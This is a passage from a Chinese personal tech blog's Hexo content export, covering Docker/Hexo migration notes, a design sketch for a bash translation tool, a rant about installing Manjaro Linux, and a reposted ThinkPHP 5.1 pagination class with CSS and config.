<h5 id="实例-1-1-4-迁机讨论和小结"><a href="#实例-1-1-4-迁机讨论和小结" class="headerlink" title="实例:1.1.4 迁机讨论和小结"></a>实例:<span id="1.1.4">1.1.4 迁机讨论和小结</span></h5><p> &emsp;回顾下整个流程,有点绕是第2步的收集迁机文件,有3个地方可能会困惑:1一个是:我们需要构建出<code>hexo</code>的容器,从容器里给复制到临时的挂载目录<code>tmp</code>,再从容器外面把文件给收集起来,那为什么不能直接从容器中导出来呢?答案是否定的!如果要从容器中原本的文件导出来,我目前也就发现这种方法而已.<br>&emsp;另一个是:<code>.ssh</code>目录?这个很好解释,如果我们不使用统一的密钥,到时候迁机要推送数据的时候又要去生成一个密钥再加到代码仓库那边,很麻烦,所以就算进迁机文件中了.<br>&emsp;最后一个是:<code>themes</code>主题目录?这个也很好解释为什么要加入到迁机目录中.如果我们使用别人的主题的话.这个主题文件是在构建容器的同时下载下来的.由于每个主题的都有着它们的配置文件,要配置才能使用,那就会出现每次迁机都要去主题配置一下,不如算进迁机文件中,这样就再也不用再次去配置了,而且也规避了一个版本风险,其实主题在迭代同时也可能会带来配置改变,同样的配置在新的主题版本不一定有用,导致<code>hexo</code>运行,无疑增加学习成本.不如选一个主题版本配置后,算进迁机上目录中.<br>&emsp;说到版本迭代,这种轻量级迁机可能会存在一个版本迭代的风险,只是有可能^_^! <code>hexo</code>它有一个配置<code>_config.yml</code>文件算在迁机文件中的所以它是不变的.但每次在构建镜像时都是下载最新版本<code>hexo</code>,如有一天迁机文件<code>_config.yml</code>配置不能满足新版本的话,可能会导致<code>hexo</code>不能正常启动.这是个问题,如果你有解决的方法也可以告诉我下,但愿我不要遇到它.<br>  当然你也可以把整个容器镜像也导出来,这样就不会出现这样的可能了.</p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>hexo</tag>
        <tag>gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」构思手稿- 去中心化shell翻译工具trans</title>
    <url>/2018/10/11/%E3%80%90linux%E3%80%91%E6%9E%84%E6%80%9D%E6%89%8B%E7%A8%BF-%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96shell%E7%BF%BB%E8%AF%91%E5%B7%A5%E5%85%B7trans/</url>
    <content><![CDATA[<p><img src="/images/trans.png" alt="upload successful"><br><a id="more"></a><br>场景：shell终端和vim终端实现单词和词句翻译。解决要翻译一个词可以直接在终端就能直接实现。<br>功能：就是下个翻译软件，不过是用shell写的。只能基于bash来运行。<br>功能2:<code>tab</code>键自动联想推荐补全。</p>
<p>构思：<br>1，安装方式<code>curl</code> ,<code>wget</code> ,<code>git</code>之一都可以进行安装，不管是哪样工具，都是运行同一个安装脚本来进行安装的。<br>2，只要有<code>curl</code>,<code>wget</code>,<code>git</code>，之一，就一定能将所有的仓库数据拉下来，并使用。<br>3，只要用户能快速查词的同时，检测线上的数据是否更新，如果更新就同步更新数据。（这个自动更新在后台并发进程执行，不能影响查词速度）。<br>4，结合vim来一起使用。能在vim中直接使用这个工具。<br>5，能tab键自动联想推荐补全。<br>6，数据渲染模板能人性化自定义。<br>7，帮助文档齐全。 <code>--help</code> <code>-h</code><br>8, 卸载 <code>uninstall</code> 要干净<br>9，提交用户修改编辑的单词数据，并作为仓库的源数据写入。<br>10，有修改纠正，并上传纠正的数据。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>设计手稿</tag>
      </tags>
  </entry>
  <entry>
    <title>「杂谈」manjaro未必坑，站长是傻逼</title>
    <url>/2018/10/09/%E3%80%90%E6%9D%82%E8%B0%88%E3%80%91manjaro%E6%9C%AA%E5%BF%85%E5%9D%91%EF%BC%8C%E7%AB%99%E9%95%BF%E6%98%AF%E5%82%BB%E9%80%BC/</url>
    <content><![CDATA[<p>&emsp;说我这个多星期被这个站长坑的有多惨，不堪回首的血泪史。话说本人热爱vim，慢慢不想在远程终端使用vim，而是直接在linux桌面上操作。所以我想找一个不用折腾（瞎折腾什么）就能用的linux发行版。安装了ubuntu，这个烂配置的电脑就快飞升了，不行换一个。于是在找网上闲逛的时候，这个坑人的站长在撸linux上发表一篇《什么Linux发行版软件最多？——一张列表看哭百万Debian、RedHat系同学》引起我的兴趣。这种添油加醋快上天的写作手法就像刚喝完一瓶红牛没想到再来一瓶，多开心啊，于是又看了《人生苦短我用Manjaro》这一标题，很感动，往事历历在目恍如昨日。于是这决定就它了。恶梦也就此拉开了序幕…<br><a id="more"></a><br> &emsp;作为一个新手，捧着2个电脑一个看着《Manjaro稳定版下载》，一个安装系统。安装很简单，哇哈哈，我果然是个天才，一个启动U盘人分分钟的事，马上就安装系统完系统并重启成功。不过我意识到这样很不完美（俺处女座的），以我功力，谈笑间毁掉一个系统不带重样的就问你怕不怕，所以安装个快照是很必要的，坏了咱就回滚多快乐（哎，说好不折腾的，果然是骗纸）。<br> &emsp; 快照工具就定为<code>snapper</code>，由于使用<code>snapper</code>要用<code>btrfs</code>格式，为省事点就重装系统。结果出事了。等了几十分钟安装滚动条都95%，我靠，安装失败了，这不能忍，重来….。我不知道这重新安装了多少次了。为了解决这个问题，我看看youtube的视频跟着他们的步骤来。他成功了，我还是失败了。不行，上百度，上谷歌，上鸭子，上manjaro官方论坛就是没有人碰到过这种问题，上QQ群（这哥们在说什么，我怎么听不懂，算了我们说我们自己的吧）没人理我，我他妈造什么孽啊，说好不折腾的。仿佛全世界就我一个，我不停的安装不停地失败不停地找问题，不停地尝试，不停地想放弃，身体还是很诚实（我他我不相信我特么的搞不定它），我怀疑了好多问题，我怀疑系统版本的问题又下载了个低版本回来。我足足折腾了8天，还是算了，我什么也没得到。而我的国庆节，我逝去的青春，没了。<br>&emsp;  于是我改变想法了，不要折腾了。不能使用btrfs就不使用吧。我决定使用<code>timeshift</code>，并分出一个单独的分区来存放<code>timeshift</code>生存的快照。安装很顺利。timeshift也安装成功了并备份了快照。测试了下。哇哈哈，回滚正常，我还是那个我，我果然还是那个天才，过去什么的都不能阻止我，电脑系统，坏了，没关系，我有快照。文件误删，我有快照。<code>vim ! I&#39;m Comming</code>。<br>&emsp;  安装<code>vim</code> 简单 <code>sudo -S vim</code> ，搞定！一启动<code>vim</code>结果他妈的提示glibc依赖小于28。再看看那个标题《人生苦短我用Manjaro》，我特么信你？没法子，新手吗，一遇到问题，只能这样了。整整3天，我上百度，上谷歌，上鸭子，上manjaro官方论坛，还是找不到答案。上QQ群，我他一面懵逼看着我（这人在说什么呀，我们怎么没遇到这样的问题，听不太懂啊！），我不断的提醒自己要冷静，认真就输了。终于我找到一条命令<code>sudo pacman -S glibc lib32-glibc --force</code>成功地把glibc升级到了28版本，感谢<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hEMmtpbGxlcnMvYXJ0aWNsZS9kZXRhaWxzLzgxMTYzMTY2" title="https://blog.csdn.net/HD2killers/article/details/81163166">https://blog.csdn.net/HD2killers/article/details/81163166<i class="fa fa-external-link"></i></span> 这个帖子和帖子他爸妈，帮助了我。我的vim 终于能打开了。<br> &emsp; vim解决了，就要安装yaourt。结果，还是失败了，提示说pacman 版本小于5.1（又是它），不能安装yaourt。这怎么能忍。我上QQ，小伙伴们都说：没有啊直接安装就行了呀（吐血！等于没说，能直接安装我会问你），还有睿智的小伙伴们说，你把源换一下，重新更新下（看见没，多设身处地的人呀，这话多有水准呀）。结果还是不行。<br> &emsp; 我一直在反省，哪里错了。我开始怀疑自己了，于是对我一个小伙伴说：大佬，你是用manjaro xfce 17.1吗？<br> &emsp; 对方：对啊。<br> &emsp;  我说：那你的系统镜像是在哪里下载的呀？<br> &emsp;大佬说：用科大的呀！<br> &emsp;（我向对方要了科大镜像的地址）<br> &emsp;我打算放弃了。但还是试试吧，没准有新的发现。于是我用科大的镜像重新安装了系统。结果出人意料地顺利。安装快照，安装vim启动vim,gm安装yaourt顺利的一匹，原来我还是我，天才的那个我。<br>&emsp; 睿智的我猛然回头。原来所有的问题根源都出现在清华的镜像上，站长，当看到我的这个评论的时候。回头看看你写的《人生苦短我用Manjaro》标题以及《Manjaro稳定版下载》当中的“清华大学镜像站下载”链接。你怎么想的，我用11天的时间得出来一个结论：你的文章写的不是你的经验而是你挖的大坑。我的青春啊！！！！</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」TP5.1学习笔记-修改分页条样式(转)</title>
    <url>/2018/10/02/%E3%80%90php%E3%80%91TP5-1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BF%AE%E6%94%B9%E5%88%86%E9%A1%B5%E6%9D%A1%E6%A0%B7%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="/images/pasted-0.png" alt="upload successful"><br><a id="more"></a></p>
<p>第一步：首先是分页类 把该类放到extend\page目录下<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">page</span>;</span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006~2017 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: zhangyajun &lt;448901948@qq.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Paginator</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Page</span> <span class="keyword">extends</span> <span class="title">Paginator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//首页</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;currentPage() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url(<span class="number">1</span>) . <span class="string">"' title='首页'&gt;首页&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;首页&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//上一页</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prev</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;currentPage() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url(<span class="keyword">$this</span>-&gt;currentPage - <span class="number">1</span>) . <span class="string">"' title='上一页'&gt;上一页&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;上一页&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//下一页</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasMore) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url(<span class="keyword">$this</span>-&gt;currentPage + <span class="number">1</span>) . <span class="string">"' title='下一页'&gt;下一页&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span><span class="string">"&lt;p&gt;下一页&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//尾页</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">last</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasMore) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url(<span class="keyword">$this</span>-&gt;lastPage) . <span class="string">"' title='尾页'&gt;尾页&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;尾页&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//统计信息</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;p class='pageRemark'&gt;共&lt;b&gt;"</span> . <span class="keyword">$this</span>-&gt;lastPage .</span><br><span class="line">            <span class="string">"&lt;/b&gt;页&lt;b&gt;"</span> . <span class="keyword">$this</span>-&gt;total . <span class="string">"&lt;/b&gt;条数据&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 页码按钮</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getLinks</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"> </span><br><span class="line">        $block = [</span><br><span class="line">            <span class="string">'first'</span>  =&gt; <span class="keyword">null</span>,</span><br><span class="line">            <span class="string">'slider'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">            <span class="string">'last'</span>   =&gt; <span class="keyword">null</span></span><br><span class="line">        ];</span><br><span class="line"> </span><br><span class="line">        $side   = <span class="number">3</span>;</span><br><span class="line">        $window = $side * <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lastPage &lt; $window + <span class="number">6</span>) &#123;</span><br><span class="line">            $block[<span class="string">'first'</span>] = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="number">1</span>, <span class="keyword">$this</span>-&gt;lastPage);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;currentPage &lt;= $window) &#123;</span><br><span class="line">            $block[<span class="string">'first'</span>] = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="number">1</span>, $window + <span class="number">2</span>);</span><br><span class="line">            $block[<span class="string">'last'</span>]  = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="keyword">$this</span>-&gt;lastPage - <span class="number">1</span>, <span class="keyword">$this</span>-&gt;lastPage);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;currentPage &gt; (<span class="keyword">$this</span>-&gt;lastPage - $window)) &#123;</span><br><span class="line">            $block[<span class="string">'first'</span>] = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">            $block[<span class="string">'last'</span>]  = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="keyword">$this</span>-&gt;lastPage - ($window + <span class="number">2</span>), <span class="keyword">$this</span>-&gt;lastPage);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $block[<span class="string">'first'</span>]  = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">            $block[<span class="string">'slider'</span>] = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="keyword">$this</span>-&gt;currentPage - $side, <span class="keyword">$this</span>-&gt;currentPage + $side);</span><br><span class="line">            $block[<span class="string">'last'</span>]   = <span class="keyword">$this</span>-&gt;getUrlRange(<span class="keyword">$this</span>-&gt;lastPage - <span class="number">1</span>, <span class="keyword">$this</span>-&gt;lastPage);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $html = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (is_array($block[<span class="string">'first'</span>])) &#123;</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getUrlLinks($block[<span class="string">'first'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (is_array($block[<span class="string">'slider'</span>])) &#123;</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getDots();</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getUrlLinks($block[<span class="string">'slider'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (is_array($block[<span class="string">'last'</span>])) &#123;</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getDots();</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getUrlLinks($block[<span class="string">'last'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $html;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 渲染分页html</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasPages()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;simple) &#123;</span><br><span class="line">                <span class="keyword">return</span> sprintf(</span><br><span class="line">                    <span class="string">'%s&lt;div class="pagination"&gt;%s %s %s&lt;/div&gt;'</span>,</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;css(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;prev(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;getLinks(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;next()</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> sprintf(</span><br><span class="line">                    <span class="string">'%s&lt;div class="pagination"&gt;%s %s %s %s %s %s&lt;/div&gt;'</span>,</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;css(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;home(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;prev(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;getLinks(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;next(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;last(),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;info()</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成一个可点击的按钮</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  int    $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getAvailablePageWrapper</span><span class="params">($url, $page)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;a href="'</span> . htmlentities($url) . <span class="string">'" title="第"'</span>. $page .<span class="string">'"页" &gt;'</span> . $page . <span class="string">'&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成一个禁用的按钮</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $text</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getDisabledTextWrapper</span><span class="params">($text)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="pageEllipsis"&gt;'</span> . $text . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成一个激活的按钮</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $text</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getActivePageWrapper</span><span class="params">($text)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;a href="" class="cur"&gt;'</span> . $text . <span class="string">'&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成省略号按钮</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getDots</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getDisabledTextWrapper(<span class="string">'...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 批量生成页码按钮.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array $urls</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getUrlLinks</span><span class="params">(array $urls)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $html = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">foreach</span> ($urls <span class="keyword">as</span> $page =&gt; $url) &#123;</span><br><span class="line">            $html .= <span class="keyword">$this</span>-&gt;getPageLinkWrapper($url, $page);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $html;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成普通页码按钮</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  int    $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getPageLinkWrapper</span><span class="params">($url, $page)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($page == <span class="keyword">$this</span>-&gt;currentPage()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getActivePageWrapper($page);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getAvailablePageWrapper($url, $page);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 分页样式</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">css</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'  &lt;style type="text/css"&gt;</span></span><br><span class="line"><span class="string">            .pagination p&#123;</span></span><br><span class="line"><span class="string">                margin:0;</span></span><br><span class="line"><span class="string">                cursor:pointer</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination&#123;</span></span><br><span class="line"><span class="string">                height:40px;</span></span><br><span class="line"><span class="string">                padding:20px 0px;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination a&#123;</span></span><br><span class="line"><span class="string">                display:block;</span></span><br><span class="line"><span class="string">                float:left;</span></span><br><span class="line"><span class="string">                margin-right:10px;</span></span><br><span class="line"><span class="string">                padding:2px 12px;</span></span><br><span class="line"><span class="string">                height:24px;</span></span><br><span class="line"><span class="string">                border:1px #cccccc solid;</span></span><br><span class="line"><span class="string">                background:#fff;</span></span><br><span class="line"><span class="string">                text-decoration:none;</span></span><br><span class="line"><span class="string">                color:#808080;</span></span><br><span class="line"><span class="string">                font-size:12px;</span></span><br><span class="line"><span class="string">                line-height:24px;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination a:hover&#123;</span></span><br><span class="line"><span class="string">                color:#077ee3;</span></span><br><span class="line"><span class="string">                background: white;</span></span><br><span class="line"><span class="string">                border:1px #077ee3 solid;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination a.cur&#123;</span></span><br><span class="line"><span class="string">                border:none;</span></span><br><span class="line"><span class="string">                background:#077ee3;</span></span><br><span class="line"><span class="string">                color:#fff;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination p&#123;</span></span><br><span class="line"><span class="string">                float:left;</span></span><br><span class="line"><span class="string">                padding:2px 12px;</span></span><br><span class="line"><span class="string">                font-size:12px;</span></span><br><span class="line"><span class="string">                height:24px;</span></span><br><span class="line"><span class="string">                line-height:24px;</span></span><br><span class="line"><span class="string">                color:#bbb;</span></span><br><span class="line"><span class="string">                border:1px #ccc solid;</span></span><br><span class="line"><span class="string">                background:#fcfcfc;</span></span><br><span class="line"><span class="string">                margin-right:8px;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination p.pageRemark&#123;</span></span><br><span class="line"><span class="string">                border-style:none;</span></span><br><span class="line"><span class="string">                background:none;</span></span><br><span class="line"><span class="string">                margin-right:0px;</span></span><br><span class="line"><span class="string">                padding:4px 0px;</span></span><br><span class="line"><span class="string">                color:#666;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination p.pageRemark b&#123;</span></span><br><span class="line"><span class="string">                color:red;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .pagination p.pageEllipsis&#123;</span></span><br><span class="line"><span class="string">                border-style:none;</span></span><br><span class="line"><span class="string">                background:none;</span></span><br><span class="line"><span class="string">                padding:4px 0px;</span></span><br><span class="line"><span class="string">                color:#808080;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            .dates li &#123;font-size: 14px;margin:20px 0&#125;</span></span><br><span class="line"><span class="string">            .dates li span&#123;float:right&#125;</span></span><br><span class="line"><span class="string">        &lt;/style&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>第二步：修改app配置文件<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页配置</span></span><br><span class="line">   <span class="string">'paginate'</span>     =&gt; [</span><br><span class="line">       <span class="string">'type'</span>    =&gt; <span class="string">'page\Page'</span>,<span class="comment">//分页类</span></span><br><span class="line">       <span class="string">'var_page'</span> =&gt; <span class="string">'page'</span>,</span><br><span class="line">       <span class="string">'list_rows'</span>=&gt; <span class="number">15</span>,</span><br><span class="line">   ],</span><br></pre></td></tr></table></figure></div></p>
<p>注:亲测试有效，文章转载自:<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZlbG9pL2FydGljbGUvZGV0YWlscy83NzE2MzYwMQ==" title="https://blog.csdn.net/veloi/article/details/77163601">https://blog.csdn.net/veloi/article/details/77163601<i class="fa fa-external-link"></i></span></p>
]]></content>
  </entry>
  <entry>
    <title>「linux」manjaro学习笔记-安装manjaro-xfce</title>
